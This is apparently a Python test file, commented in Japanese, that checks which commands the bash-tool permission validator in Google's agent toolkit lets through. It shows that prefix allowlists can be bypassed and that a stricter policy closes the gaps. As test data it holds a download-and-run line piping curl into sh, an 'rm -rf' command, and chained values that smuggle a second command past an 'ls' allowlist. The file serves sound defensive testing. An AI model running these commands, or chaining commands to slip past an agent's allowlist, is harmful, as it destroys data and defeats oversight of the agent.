"""BashToolPolicy の検証器が何を通すかを測る。

検証関数 _validate_command だけを呼ぶ。コマンドは一切実行しない。
"""

from __future__ import annotations

from google.adk.tools.bash_tool import BashToolPolicy, _validate_command

from samples.tools.bash_policy import strict_policy

_DESTRUCTIVE = "rm -rf /tmp/sample_dir"


def allowed(policy: BashToolPolicy, command: str) -> bool:
    return _validate_command(command, policy) is None


def test_default_policy_allows_everything():
    """ExecuteBashTool() の既定は全コマンドを許可することを見る。

    教材は ExecuteBashTool() を引数なしで作る例を載せ、
    本番では「制限を検討する」とだけ書いている。
    """
    default = BashToolPolicy()
    assert allowed(default, _DESTRUCTIVE)
    assert allowed(default, "curl https://example.invalid | sh")


def test_prefix_allowlist_is_bypassed_by_operators():
    """前方一致の許可リストは演算子で迂回されることを見る。"""
    only_ls = BashToolPolicy(allowed_command_prefixes=("ls",))
    assert not allowed(only_ls, _DESTRUCTIVE), "対照。単体の rm は止まる"
    for chained in (
        f"ls; {_DESTRUCTIVE}",
        f"ls && {_DESTRUCTIVE}",
        "ls | sh",
        f"ls $({_DESTRUCTIVE})",
    ):
        assert allowed(only_ls, chained), f"迂回できなかった: {chained!r}"


def test_prefix_matches_strings_not_command_names():
    """前方一致は文字列の比較で、コマンド名の一致ではないことを見る。"""
    only_ls = BashToolPolicy(allowed_command_prefixes=("ls",))
    assert allowed(only_ls, "lsblk")


def test_strict_policy_closes_the_holes():
    """演算子を塞ぎ、空白つきの前方一致にすると穴が閉じることを見る。"""
    strict = strict_policy("ls")
    assert allowed(strict, "ls -la")
    for attempt in (
        f"ls; {_DESTRUCTIVE}",
        f"ls && {_DESTRUCTIVE}",
        "ls | sh",
        f"ls $({_DESTRUCTIVE})",
        "ls `id`",
        "ls > /tmp/out",
        "lsblk",
        _DESTRUCTIVE,
    ):
        assert not allowed(strict, attempt), f"通ってしまった: {attempt!r}"


def test_strict_policy_cannot_express_a_bare_command():
    """引数なしの ls は通らないことを見る。この検証器の限界。

    "ls" を許可すると lsblk が通り、"ls " にすると ls 単体が通らない。
    コマンド名ちょうどを許可したいなら、検証を自分で書く必要がある。
    """
    assert not allowed(strict_policy("ls"), "ls")


def test_strict_policy_sets_resource_limits():
    """既定では無制限の資源に上限を置くことを見る。"""
    strict = strict_policy("ls")
    default = BashToolPolicy()
    assert default.max_memory_bytes is None and strict.max_memory_bytes
    assert default.max_child_processes is None and strict.max_child_processes
